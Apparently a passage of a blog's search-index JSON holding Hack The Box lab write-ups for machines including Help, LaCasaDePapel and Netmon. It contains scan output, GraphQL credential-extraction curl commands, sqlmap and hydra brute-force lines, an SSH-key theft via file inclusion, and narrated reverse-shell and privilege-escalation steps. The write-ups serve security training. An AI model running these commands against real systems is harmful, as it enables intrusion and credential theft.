the location, which is /etc Let\u0026rsquo;s check Time to get our reverse-shell User Upload and run linpeas Let\u0026rsquo;s check mysql_data.conf Try su - friend in case of cred reuse Root Let\u0026rsquo;s check /opt/server_admin We see that this job is automated We see a writable module os.py, which is included in the script above We can hijack it according to this post Check the python path order We see the first line is blank, which is according to the post is the Directory of the script being executed We can try creating os.py there or simply add payload to existing os.py since we can write to it Let\u0026rsquo;s simply add payload to existing file Set up listener and for connection ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/friendzone/images/friendzone.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/friendzone/","summary":"FriendZone Enumeration nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.123 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 15:55 BST Nmap scan report for 10.10.10.123 (10.10.10.123) Host is up (0.13s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA) | 256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA) |_ 256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519) 53/tcp open domain ISC BIND 9.","tags":["HTB"],"title":"[HTB] Machine: FriendZone"},{"categories":null,"contents":"Help Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.121 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 18:37 BST Nmap scan report for 10.10.10.121 (10.10.10.121) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5bb4d9cdeaf6bbfba8c227ad8d74328 (RSA) | 256 d5b010507486a39fc5536f3b4a246119 (ECDSA) |_ 256 e21b88d37621d41e38154a8111b79907 (ED25519) 80/tcp open http Apache httpd 2.4.18 |_http-title: Did not follow redirect to http://help.htb/ |_http-server-header: Apache/2.4.18 (Ubuntu) 3000/tcp open http Node.js Express framework |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=utf-8). Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.49 seconds gobuster â””â”€$ gobuster dir -u http://help.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://help.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: html,txt,php [+] Timeout: 10s =============================================================== 2023/06/20 17:43:00 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 287] /.html (Status: 403) [Size: 288] /index.html (Status: 200) [Size: 11321] /support (Status: 301) [Size: 306] [--\u0026gt; http://help.htb/support/] /javascript (Status: 301) [Size: 309] [--\u0026gt; http://help.htb/javascript/] Web server Port 3000 If we check the response headers It\u0026rsquo;s says powered by Express If we google about Express and it\u0026rsquo;s query language we see GraphQL Foothold Let\u0026rsquo;s enumerate GraphQL Docs Query all information regarding types We see that we have user query User type with username and password fields â””â”€$ curl -s 10.10.10.121:3000/graphql -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{ \u0026#34;query\u0026#34;: \u0026#34;{ __schema { types { name, fields { name, description } } } }\u0026#34; }\u0026#39; | jq { \u0026#34;data\u0026#34;: { \u0026#34;__schema\u0026#34;: { \u0026#34;types\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Query\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34; } ] }, { \u0026#34;name\u0026#34;: \u0026#34;User\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;username\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34; } ] }, { \u0026#34;name\u0026#34;: \u0026#34;String\u0026#34;, \u0026#34;fields\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;__Schema\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;types\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;A list of all types supported by this server.\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;queryType\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;The type that query operations will be rooted at.\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;mutationType\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;If this server supports mutation, the type that mutation operations will be rooted at.\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;subscriptionType\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;If this server support subscription, the type that subscription operations will be rooted at.\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;directives\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;A list of all directives supported by this server.\u0026#34; } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__Type\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;kind\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;fields\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;interfaces\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;possibleTypes\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;enumValues\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;inputFields\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;ofType\u0026#34;, \u0026#34;description\u0026#34;: null } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__TypeKind\u0026#34;, \u0026#34;fields\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;Boolean\u0026#34;, \u0026#34;fields\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;__Field\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;args\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;type\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;isDeprecated\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;deprecationReason\u0026#34;, \u0026#34;description\u0026#34;: null } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__InputValue\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;type\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;defaultValue\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;A GraphQL-formatted string representing the default value for this input value.\u0026#34; } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__EnumValue\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;isDeprecated\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;deprecationReason\u0026#34;, \u0026#34;description\u0026#34;: null } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__Directive\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;locations\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;args\u0026#34;, \u0026#34;description\u0026#34;: null } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__DirectiveLocation\u0026#34;, \u0026#34;fields\u0026#34;: null } ] } } } user query returns User type â””â”€$ curl -s 10.10.10.121:3000/graphql -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{ \u0026#34;query\u0026#34;: \u0026#34;{ __schema { queryType { name, fields { name, description, args {name}, type {name} } } } }\u0026#34; }\u0026#39; | jq { \u0026#34;data\u0026#34;: { \u0026#34;__schema\u0026#34;: { \u0026#34;queryType\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;Query\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;args\u0026#34;: [], \u0026#34;type\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;User\u0026#34; } } ] } } } } Let\u0026rsquo;s query â””â”€$ curl -s 10.10.10.121:3000/graphql -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{ \u0026#34;query\u0026#34;: \u0026#34;{ user { username password } }\u0026#34; }\u0026#39; | jq { \u0026#34;data\u0026#34;: { \u0026#34;user\u0026#34;: { \u0026#34;username\u0026#34;: \u0026#34;helpme@helpme.com\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;5d3c93182bb20f07b994a7f617e99cff\u0026#34; } } } Crack the hash Let\u0026rsquo;s find a place where we can use those credentials We saw support endpoint in gobuster results let\u0026rsquo;s open it Use the creds It\u0026rsquo;s a HelpDeskZ Let\u0026rsquo;s find the version We have 2 possible exploits related to version \u0026lt;= 1.0.2 The older version of HelpDeskZ have a readme.html file Github Let\u0026rsquo;s check SQL Injection We have to follow the steps specified in the exploit Create a ticket Open a ticket and check the attachment link In my case: http://help.htb/support/?v=view_tickets\u0026amp;action=ticket\u0026amp;param[]=4\u0026amp;param[]=attachment\u0026amp;param[]=1\u0026amp;param[]=6 Open Burp Suite and click the attachment link Copy to file the request Let\u0026rsquo;s launch sqlmap sqlmap -r help.req --level 5 --risk 3 -p param[] --dump or you can dump specific table: sqlmap -r help.req --level 5 --risk 3 -p param[] --dump -D support -T staff And we get the results We have our password, let\u0026rsquo;s try with different usernames We can use hydra hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p 'Welcome1' ssh://10.10.10.121 Root Let\u0026rsquo;s enumerate for privesc The kernel version is 4.4.-116-generic Exploit Download and compile it Upload to server and run First, I compiled it on my own machine and uploaded, but it didn\u0026rsquo;t work since the versions of glibc were different Then, I simply uploaded the source code, knowing I had gcc on the box, compiled it and ran it ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/help/images/help.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/help/","summary":"Help Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.121 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 18:37 BST Nmap scan report for 10.10.10.121 (10.10.10.121) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5bb4d9cdeaf6bbfba8c227ad8d74328 (RSA) | 256 d5b010507486a39fc5536f3b4a246119 (ECDSA) |_ 256 e21b88d37621d41e38154a8111b79907 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Help"},{"categories":null,"contents":"LaCasaDePapel Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.131 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 16:13 BST Nmap scan report for 10.10.10.131 (10.10.10.131) Host is up (0.19s latency). Not shown: 982 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA) | 256 41e495a3390b25f9dadebe6adc59486d (ECDSA) |_ 256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519) 80/tcp open http Node.js (Express middleware) |_http-title: La Casa De Papel 119/tcp filtered nntp 443/tcp open ssl/http Node.js Express framework |_http-title: La Casa De Papel | tls-nextprotoneg: | http/1.1 |_ http/1.0 | ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel | Not valid before: 2019-01-27T08:35:30 |_Not valid after: 2029-01-24T08:35:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. 1065/tcp filtered syscomlan 1084/tcp filtered ansoft-lm-2 1112/tcp filtered msql 1914/tcp filtered elm-momentum 2034/tcp filtered scoremgr 2119/tcp filtered gsigatekeeper 4444/tcp filtered krb524 7000/tcp filtered afs3-fileserver 15660/tcp filtered bex-xr 19350/tcp filtered unknown 20031/tcp filtered unknown 34571/tcp filtered unknown 52869/tcp filtered unknown Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 80.58 seconds Web Server Foothold vsftpd 2.3.4 Exploit Let\u0026rsquo;s run it It\u0026rsquo;s a psy If we ran phpinfo(), we see that there is a list of disabled functions User I tried opening users\u0026rsquo; home directories and their .ssh folder, but had no success Found ca.key We can use openssl to check TLS configurations â””â”€$ openssl s_client -connect 10.10.10.131:443 CONNECTED(00000003) Can\u0026#39;t use SSL_get_servername depth=0 CN = lacasadepapel.htb, O = La Casa De Papel verify error:num=18:self-signed certificate verify return:1 depth=0 CN = lacasadepapel.htb, O = La Casa De Papel verify return:1 --- Certificate chain 0 s:CN = lacasadepapel.htb, O = La Casa De Papel i:CN = lacasadepapel.htb, O = La Casa De Papel a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256 v:NotBefore: Jan 27 08:35:30 2019 GMT; NotAfter: Jan 24 08:35:30 2029 GMT --- Server certificate -----BEGIN CERTIFICATE----- MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8 /rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B 4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6 vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4 -----END CERTIFICATE----- subject=CN = lacasadepapel.htb, O = La Casa De Papel issuer=CN = lacasadepapel.htb, O = La Casa De Papel --- Acceptable client certificate CA names CN = lacasadepapel.htb, O = La Casa De Papel Client Certificate Types: RSA sign, DSA sign, ECDSA sign Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1 Shared Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1 Peer signing digest: SHA512 Peer signature type: RSA Server Temp Key: ECDH, prime256v1, 256 bits --- SSL handshake has read 1537 bytes and written 561 bytes Verification error: self-signed certificate --- New, TLSv1.2, Cipher is ECDHE-RSA-AES128-GCM-SHA256 Server public key is 2048 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES128-GCM-SHA256 Session-ID: CB1545984AC48ABA22DD66B3232679DE2FD4EE27366D7CA1F7C0CD415F2721D7 Session-ID-ctx: Master-Key: C377D9A9FF84789464AC768D8EA03AA3EB6AB15CA746294C683E050C4AB21C3F679953885BF25CEB256E03BC59B97EE4 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 300 (seconds) TLS session ticket: 0000 - fa 80 99 68 e5 6a 75 04-a9 f0 4d bc 3f 88 98 bf ...h.ju...M.?... 0010 - 78 59 49 13 72 6a c4 d7-39 ad b3 0c da bc 5c c2 xYI.rj..9.....\\. 0020 - ce f9 39 99 eb 05 0d dc-cf 79 87 60 6b 98 98 67 ..9......y.`k..g 0030 - 7e 6d b3 ba 60 8a af 32-cc 6b cd 69 a1 be 4c 42 ~m..`..2.k.i..LB 0040 - 95 1f a6 2b 31 03 84 6c-7b 60 71 a6 c9 2d 17 e0 ...+1..l{`q..-.. 0050 - 67 21 af 52 27 47 3d 07-f0 d8 67 b1 76 c5 86 86 g!.R\u0026#39;G=...g.v... 0060 - 9f dd 35 aa 49 5b c2 e3-6e 42 20 33 a4 04 1f 4e ..5.I[..nB 3...N 0070 - cf 0a 29 3c 26 71 8d bd-42 f2 e4 d7 d1 83 54 2f ..)\u0026lt;\u0026amp;q..B.....T/ 0080 - a0 3a fa 1a ef 46 9b 38-38 69 d5 5d 60 0f 9f fa .:...F.88i.]`... 0090 - 6e 1f a0 57 14 97 eb 3b-b7 42 e4 d1 42 f0 97 77 n..W...;.B..B..w 00a0 - 75 09 22 d0 46 3a 1f 17-b4 86 63 c5 03 21 44 37 u.\u0026#34;.F:....c..!D7 00b0 - 98 de c1 f0 f8 7d fb b6-62 66 b5 d5 08 16 aa 40 .....}..bf.....@ Start Time: 1687192547 Timeout : 7200 (sec) Verify return code: 18 (self-signed certificate) Extended master secret: no --- Let\u0026rsquo;s generate pkcs12 certificate using ca\u0026rsquo;s key and certificate Import it to firefox Refresh the page and turn off Burp Suite Press Ok When opening SEASON-1 it redirects to https://10.10.10.131/?path=SEASON-1 Download any file Let\u0026rsquo;s grab ssh keys from all users, since we have lfi I only was able to download berlin\u0026rsquo;s id_rsa Let\u0026rsquo;s use to connect as any user Found a nice way to try each user from 0xdf: for user in berlin dali nairobi oslo professor; do ssh -oBatchMode=yes -i ~/id_rsa_lacasadepapel_berlin $user@10.10.10.131; done I had an issue with format of the key, so I downloaded it using curl: curl -k https://10.10.10.131/file/Li4vLnNzaC9pZF9yc2E= Don\u0026rsquo;t forget to set permissions to 600 Root We have a memcached.ini We see there is a process running as nobody Running pspy will tell you that there is a automated job running every few minutes So we can try changing the command, but we can\u0026rsquo;t since it\u0026rsquo;s owned by root But we can delete it and create a new one, since the directory is owned by professor Let\u0026rsquo;s delete and create a file And we have our root ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/images/lacasadepapel.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/","summary":"LaCasaDePapel Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.131 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 16:13 BST Nmap scan report for 10.10.10.131 (10.10.10.131) Host is up (0.19s latency). Not shown: 982 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA) | 256 41e495a3390b25f9dadebe6adc59486d (ECDSA) |_ 256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519) 80/tcp open http Node.","tags":["HTB"],"title":"[HTB] Machine: LaCasaDePapel"},{"categories":null,"contents":"Netmon Enumeration nmap â””â”€$ nmap -sC -sV -Pn -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 20:11 BST Nmap scan report for 10.10.10.152 (10.10.10.152) Host is up (0.16s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-03-19 12:18AM 1024 .rnd | 02-25-19 10:15PM \u0026lt;DIR\u0026gt; inetpub | 07-16-16 09:18AM \u0026lt;DIR\u0026gt; PerfLogs | 02-25-19 10:56PM \u0026lt;DIR\u0026gt; Program Files | 02-03-19 12:28AM \u0026lt;DIR\u0026gt; Program Files (x86) | 02-03-19 08:08AM \u0026lt;DIR\u0026gt; Users |_02-25-19 11:49PM \u0026lt;DIR\u0026gt; Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) |_http-trane-info: Problem with XML parsing of /evox/about | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm |_http-server-header: PRTG/18.1.37.13946 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2023-06-15T19:11:33 |_ start_date: 2023-06-15T18:35:59 | smb2-security-mode: | 311: |_ Message signing enabled but not required |_clock-skew: mean: -29s, deviation: 0s, median: -29s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 67.73 seconds Web server Foothold/User/Root After trying default creds for PRTG, I enumerated ftp Seems like we can read majority of the folders Let\u0026rsquo;s check PRTG installed folder and search for creds According to post we have to check ProgramdData\\Paessler\\PRTG Network Monitor We see a backup configuration file PRTG Configuration.old.bak Let\u0026rsquo;s download it We found our creds No success However, if we check the screenshot and the password, the backup file was created in 2018, so lets try 2019 and so on It worked, the password ends with 2019 There is a post about command injection in PRTG Open the page indicated in the screen Add new notification Scroll down and select Execute Program Add your payload to parameter I tried different variations of payload, like adding a new user, reverse shell from https://www.revshells.com/ So the solution was to use encoded reverse shell for powershell, but with conversion to UTF-16LE Save Test notification Rooted ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/netmon/images/netmon.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/netmon/","summary":"Netmon Enumeration nmap â””â”€$ nmap -sC -sV -Pn -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 20:11 BST Nmap scan report for 10.10.10.152 (10.10.10.152) Host is up (0.16s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-03-19 12:18AM 1024 .rnd | 02-25-19 10:15PM \u0026lt;DIR\u0026gt; inetpub | 07-16-16 09:18AM \u0026lt;DIR\u0026gt; PerfLogs | 02-25-19 10:56PM \u0026lt;DIR\u0026gt; Program Files | 02-03-19 12:28AM \u0026lt;DIR\u0026gt; Program Files (x86) | 02-03-19 08:08AM \u0026lt;DIR\u0026gt; Users |_02-25-19 11:49PM \u0026lt;DIR\u0026gt; Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Indy httpd 18.","tags":["HTB"],"title":"[HTB] Machine: Netmon"},{"categories":null,"contents":"SwagShop Enumeration nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.140 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 12:50 BST Nmap scan report for 10.10.10.140 (10.10.10.140) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b6552bd24e8fa3817261379a12f624ec (RSA) | 256 2e30007a92f0893059c17756ad51c0ba (ECDSA) |_ 256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Did not follow redirect to http://swagshop.htb/ |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.83 seconds gobuster â””â”€$ gobuster dir -u http://swagshop.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://swagshop.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/06/17 13:09:03 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 291] /index.php (Status: 200) [Size: 16593] /media (Status: 301) [Size: 312] [--\u0026gt; http://swagshop.htb/media/] /includes (Status: 301) [Size: 315] [--\u0026gt; http://swagshop.htb/includes/] /lib (Status: 301) [Size: 310] [--\u0026gt; http://swagshop.htb/lib/] /install.php (Status: 200) [Size: 44] /app (Status: 301) [Size: 310] [--\u0026gt; http://swagshop.htb/app/] /js (Status: 301) [Size: 309] [--\u0026gt; http://swagshop.htb/js/] /api.php (Status: 200) [Size: 37] /shell (Status: 301) [Size: 312] [--\u0026gt; http://swagshop.htb/shell/] /skin (Status: 301) [Size: 311] [--\u0026gt; http://swagshop.htb/skin/] /cron.php (Status: 200) [Size: 0] /var (Status: 301) [Size: 310] [--\u0026gt; http://swagshop.htb/var/] /errors (Status: 301) [Size: 313] [--\u0026gt; http://swagshop.htb/errors/] /.php (Status: 403) [Size: 291] /mage (Status: 200) [Size: 1319] /server-status (Status: 403) [Size: 300] Web server Admin page No info about the version Foothold/User Searchsploit Run poc\nLogin with creds Now we can try authenicated RCEs By the way, if you need to install pip2.7 Exploit Well, it\u0026rsquo;s not working The first error was solved by commenting: br.form.new_control('text', 'login[username]', {'value': username}) Now we need to find a way to solve the another error Launch Burp Suite and check requests Okay we send 